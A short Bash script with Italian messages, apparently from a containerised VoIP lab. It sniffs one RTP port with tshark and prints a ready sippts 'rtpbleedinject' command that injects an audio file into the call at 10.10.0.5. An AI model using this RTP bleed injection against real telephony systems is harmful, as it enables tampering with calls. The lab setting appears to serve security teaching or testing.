#!/bin/bash
# get-attack-cmd.sh

set -e

# Se l'utente passa l'argomento --port-only, lavoriamo in modalità silenziosa
PORT_ONLY=false
if [ "$1" == "--port-only" ]; then
    PORT_ONLY=true
fi

if [ "$PORT_ONLY" = false ]; then
    echo "[*] In attesa di intercettare il traffico RTP..."
fi

# Cattura la porta usando tshark nel container wireshark
PORT=$(docker exec wireshark tshark -i eth0 -f "udp portrange 10000-10099" -c 1 -T fields -e udp.dstport 2>/dev/null | head -n 1 | tr -d '\r')

if [ -z "$PORT" ]; then
    if [ "$PORT_ONLY" = false ]; then
        echo "[!] Errore: Nessun traffico RTP rilevato."
    fi
    exit 1
fi

if [ "$PORT_ONLY" = true ]; then
    # Stampa solo il numero della porta per il Makefile
    echo "$PORT"
else
    echo "[+] Porta bersaglio rilevata: $PORT"
    echo "=========================================================================="
    echo "Comando da lanciare:"
    echo -e "\033[1;32mdocker exec sippts sippts rtpbleedinject -i 10.10.0.5 -r $PORT -f /audio_inject.wav -p 0\033[0m"
fi